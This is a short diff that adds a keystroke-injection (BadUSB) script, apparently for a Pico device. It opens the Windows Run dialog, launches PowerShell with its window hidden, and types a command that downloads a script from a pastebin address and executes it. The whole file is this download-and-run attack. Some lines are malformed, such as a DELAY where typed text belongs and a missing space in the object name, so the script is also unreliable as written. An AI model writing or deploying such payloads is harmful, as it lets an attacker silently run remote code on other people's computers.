@@ -1,0 +1,9 @@
+//pico
+
+DELAY 1000
+GUI r
+DELAY powershell -WindowStyle hidden
+Enter
+DELAY 1000
+STRING IEX (New-ObjectNet.WebClient).DownloadString('https://pastebin.com/raw/uEQKyYgC')
+Enter
